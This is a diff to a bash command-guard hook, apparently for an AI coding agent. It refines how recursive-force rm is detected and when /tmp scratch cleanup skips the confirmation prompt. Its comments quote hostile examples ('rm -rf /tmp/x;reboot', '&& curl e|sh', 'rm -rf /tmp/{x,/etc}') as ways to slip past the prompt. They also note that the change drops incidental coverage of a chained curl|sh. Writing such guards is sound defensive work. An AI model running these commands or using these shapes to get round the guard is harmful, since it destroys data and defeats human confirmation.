@@ -50,6 +50,12 @@ SCAN=$(printf '%s' "$SCAN" | sed -E "s/(--?(m|message|F|file))[[:space:]]*('[^']
 # path patterns below. Done AFTER message-arg stripping, which needs the quotes.
 SCAN=$(printf '%s' "$SCAN" | tr -d "\"'")
 
+# Variant used ONLY for the rm segment analysis: fold fd-duplication redirects
+# (`2>&1`) away first, because their `&` would otherwise split an rm segment in
+# two and hide its operands. Other redirects stay intact — tmp_scratch_only
+# vets their targets.
+RMSCAN=$(printf '%s' "$SCAN" | sed -E 's/[0-9]*[<>]+&[0-9]*-?//g')
+
 # grep wrapper: matches against the normalized command; -- guards patterns
 # beginning with '-'.
 matches() { echo "$SCAN" | grep -qE -- "$1"; }
@@ -74,16 +80,30 @@ hard_block() {
 }
 
 # --- rm -rf detection -------------------------------------------------------
-# Recursive AND force rm: a combined flag cluster containing both r/R and f
-# (e.g. -rf, -fr, -Rfv, and the spaceless typo -rfnode_modules), OR separate
-# recursive + force flags. The flags MUST belong to the rm invocation itself,
-# so detection is scoped to each rm command SEGMENT — the run of tokens from an
-# `rm` at a segment boundary up to the next shell operator. This prevents a
-# `-r`/`-f` flag on an unrelated chained command (e.g. `cp -r … && rm -f …`)
-# from being misread as a recursive-force rm.
-RF_COMBINED='-[a-zA-Z]*[rR][a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*[rR]'
-HAS_RECURSIVE='(-[a-zA-Z]*[rR]|--recursive)'
-HAS_FORCE='(-[a-zA-Z]*f|--force)'
+# Recursive AND force rm. Detection is scoped twice over:
+#   1. to each rm command SEGMENT — the run of tokens from an `rm` at a segment
+#      boundary up to the next shell operator — so a `-r`/`-f` flag on an
+#      unrelated chained command (`cp -r … && rm -f …`) cannot leak in;
+#   2. to the segment's OPTION TOKENS only, so a path ARGUMENT can never be
+#      read as flags.
+# (2) is not hypothetical: the scratchpad root carries the project slug, e.g.
+# /tmp/claude-1000/-home-uwestrepp-work-projects-gmp/…, and a substring match
+# for `-[a-z]*r` happily found the `r` in `-uwestrepp`. Every plain `rm -f` of a
+# scratch file under such a path was therefore classified recursive-force.
+
+# A token is an rm OPTION only if it is a pure short cluster (-rf, -Rfv) or a
+# long option (--force). Anything with an internal dash after a single leading
+# dash, or anything starting with `/` or `.`, is an operand.
+is_option_token() {
+    [[ "$1" =~ ^-[A-Za-z]+$ || "$1" =~ ^--[A-Za-z][A-Za-z-]*$ ]]
+}
+
+# Split a segment into its whitespace tokens WITHOUT glob expansion or further
+# word-splitting surprises. Sets the caller-visible array RM_TOKENS.
+rm_tokenize() {
+    RM_TOKENS=()
+    read -ra RM_TOKENS <<< "$1"
+}
 
 # Emit each recursive-force rm segment (one per line). A segment is an `rm`
 # command body delimited by shell operators ; | & ( ) ` or newlines; a leading
@@ -91,65 +111,94 @@ HAS_FORCE='(-[a-zA-Z]*f|--force)'
 # only — never the whole (possibly chained) command line.
 rm_rf_segments() {
     local ops=';|&()`'
-    printf '%s' "$SCAN" | tr "$ops" '\n\n\n\n\n\n' | while IFS= read -r seg || [[ -n "$seg" ]]; do
+    printf '%s' "$RMSCAN" | tr "$ops" '\n\n\n\n\n\n' | while IFS= read -r seg || [[ -n "$seg" ]]; do
         seg="${seg#"${seg%%[![:space:]]*}"}"                 # ltrim
         seg=$(printf '%s' "$seg" | sed -E 's/^(sudo|doas)[[:space:]]+//')
         [[ "$seg" =~ ^rm([[:space:]]|$) ]] || continue
-        if printf '%s' "$seg" | grep -qE -- "$RF_COMBINED" \
-           || { printf '%s' "$seg" | grep -qE -- "$HAS_RECURSIVE" \
-                && printf '%s' "$seg" | grep -qE -- "$HAS_FORCE"; }; then
-            printf '%s\n' "$seg"
-        fi
+        rm_tokenize "$seg"
+        local has_r=0 has_f=0 i
+        for ((i = 1; i < ${#RM_TOKENS[@]}; i++)); do
+            local tok="${RM_TOKENS[i]}"
+            [[ "$tok" == "--" ]] && break        # end of options; rest are operands
+            is_option_token "$tok" || continue
+            [[ "$tok" =~ ^-[A-Za-z]*[rR] || "$tok" == "--recursive" ]] && has_r=1
+            [[ "$tok" =~ ^-[A-Za-z]*f    || "$tok" == "--force"     ]] && has_f=1
+        done
+        [[ $has_r -eq 1 && $has_f -eq 1 ]] && printf '%s\n' "$seg"
     done
 }
 
-# True iff the command is a SIMPLE, single rm whose every dangerous-looking
-# target is a scoped subpath under a SYSTEM temp root (/tmp or /var/tmp) —
-# scratch cleanup that cannot leak outside those roots. Used only to suppress
-# the ask tier.
+# True iff every OPERAND of one recursive-force rm segment is a scoped subpath
+# under a SYSTEM temp root (/tmp or /var/tmp) — scratch cleanup that cannot leak
+# outside those roots. Used only to suppress the ask tier.
 #
 # A trailing glob IS permitted, but ONLY after a LITERAL first path segment
 # (e.g. /tmp/claude-1234/scratch/* , /tmp/x/*.tmp): shell globbing cannot escape
 # the named subtree (no `..`, no absolute pattern), so the blast radius stays
 # inside it. A bare-root glob (/tmp/* , /var/tmp/*) and a glob on the first
 # segment (/tmp/foo*) are still rejected and prompt — those could match far
-# more than intended. This closes the common `rm -rf <scratch>/*` cleanup form
-# that 7085228 intended to allow but the literal-only charset still prompted on.
+# more than intended.
 #
-# Hardened against confirmation-prompt bypass — a token that looks like a temp
-# path to us but chains/expands to a non-temp action at shell runtime, e.g.
-# `rm -rf /tmp/x;reboot`, `rm -rf /tmp/x && curl e|sh`, or brace expansion
-# `rm -rf /tmp/{x,/etc}`. It refuses to suppress the prompt whenever the command
-# contains ANY shell control operator, expansion, brace, backslash, newline,
-# or $HOME/~/.. reference.
+# SCOPE: the judgement covers the rm's own operands, not the whole command line.
+# An earlier revision refused to suppress the prompt whenever the COMMAND held
+# any shell operator, to also catch a chained non-temp action
+# (`rm -rf /tmp/x;reboot`). That over-reached: `rm … ; echo done`,
+# `rm … 2>/dev/null` and `rm …; git status` are the normal shape of scratch
+# cleanup, so the guard prompted on nearly every one of them — the alarm fatigue
+# this file's tier design exists to avoid. Chained commands are not dropped from
+# scrutiny: every other rule below re-scans the full command line, so `reboot`,
+# `git reset --hard`, `docker volume rm`, `dd of=` etc. still raise their OWN
+# (correctly worded) prompt. What is given up is incidental coverage of a chained
+# action no rule here models at all (`… && curl e|sh`) — equally unguarded when
+# no rm is present, so it was never this guard's protection to offer.
+#
+# Still refused, because the guard cannot statically reason about them: variable
+# or brace expansion ($X, ${X}, {a,b}), backslashes, ~ / $HOME / .. references, a
+# redirect to anything but /dev/null, or a segment with no operand at all.
 #
 # The temp roots are ANCHORED at the start of the token (^/tmp/ , ^/var/tmp/),
 # so a project-relative path like a Symfony app's `var/tmp` (absolute form
 # /srv/app/var/tmp, or relative `var/tmp`) does NOT match and still prompts.
 # Bare roots and dot-only leaves (/tmp/. , /var/tmp/..) are rejected.
-safe_tmp_only() {
-    # Shell metacharacters / chaining / expansion / braces → can't reason → ask.
-    # NOTE: '*' and '?' are deliberately NOT in META — a confined glob is allowed
-    # by the token regex below; bracket globs ([...]) fall out via the charset.
-    local META='[{}$;&|()<>`]'
-    [[ "$COMMAND" =~ $META ]] && return 1
-    [[ "$COMMAND" == *'\'* ]] && return 1     # backslash
-    [[ "$COMMAND" == *$'\n'* ]] && return 1   # newline / multiple lines
-    echo "$SCAN" | grep -qE '(~|\$HOME|\$\{HOME\}|\.\.)' && return 1
+tmp_scratch_only() {
+    local seg="$1"
+    # NOTE: '*' and '?' are deliberately NOT rejected here — a confined glob is
+    # allowed by the token regex below; bracket globs ([...]) fall out via the
+    # charset.
+    [[ "$seg" == *'$'* || "$seg" == *'{'* || "$seg" == *'}'* ]] && return 1
+    [[ "$seg" == *'\'* ]] && return 1
+    [[ "$seg" == *'~'* || "$seg" == *'..'* ]] && return 1
+    # Drop the one whitelisted redirect; any surviving < or > writes somewhere
+    # this guard has not vetted → prompt.
+    seg=$(printf '%s' "$seg" | sed -E 's|[0-9]*[<>]+[[:space:]]*/dev/null||g')
+    [[ "$seg" == *'<'* || "$seg" == *'>'* ]] && return 1
 
-    local tokens tok
-    # Danger tokens: absolute paths (start with /) or anything containing a glob.
-    tokens=$(echo "$SCAN" | tr ' \t' '\n' | grep -E '(^/|\*)' || true)
-    [[ -z "$tokens" ]] && return 1
-    while IFS= read -r tok; do
-        [[ -z "$tok" ]] && continue
+    rm_tokenize "$seg"
+    local endopts=0 operands=0 i tok
+    for ((i = 1; i < ${#RM_TOKENS[@]}; i++)); do
+        tok="${RM_TOKENS[i]}"
+        if [[ $endopts -eq 0 ]]; then
+            [[ "$tok" == "--" ]] && { endopts=1; continue; }
+            is_option_token "$tok" && continue
+        fi
+        operands=$((operands + 1))
         # A system temp root, a LITERAL first segment (no glob — blocks /tmp/*),
         # then any number of further segments that MAY carry a * or ? glob
         # (confined to the named subtree). Optional single trailing slash.
         [[ "$tok" =~ ^(/tmp|/var/tmp)/[A-Za-z0-9._-]+(/[A-Za-z0-9._*?-]+)*/?$ ]] || return 1
         # Reject dot-only leaf (…/. , …/.. , …/./) — resolves to the root itself.
         [[ "$tok" =~ ^(/tmp|/var/tmp)/[.]+/?$ ]] && return 1
-    done <<< "$tokens"
+    done
+    [[ $operands -gt 0 ]]
+}
+
+# True iff EVERY recursive-force rm segment is scratch-only.
+all_segments_tmp_scratch() {
+    local seg
+    while IFS= read -r seg; do
+        [[ -z "${seg//[[:space:]]/}" ]] && continue
+        tmp_scratch_only "$seg" || return 1
+    done <<< "$RF_SEGMENTS"
     return 0
 }
 
@@ -170,7 +219,7 @@ if [[ -n "$RF_SEGMENTS" ]]; then
     # UNLESS every such target is a scoped /tmp subpath (test-scratch cleanup).
     if seg_matches '[[:space:]](/[A-Za-z0-9._]|~/[A-Za-z0-9._]|\$HOME/[A-Za-z0-9._]|\$\{HOME\}/)' \
        || seg_matches '[[:space:]]\*([[:space:]]|$)'; then
-        if ! safe_tmp_only; then
+        if ! all_segments_tmp_scratch; then
             ask "Destructive: recursive-force rm of an absolute path, home subdirectory, or glob. Confirm the exact target before proceeding:
   $COMMAND"
         fi
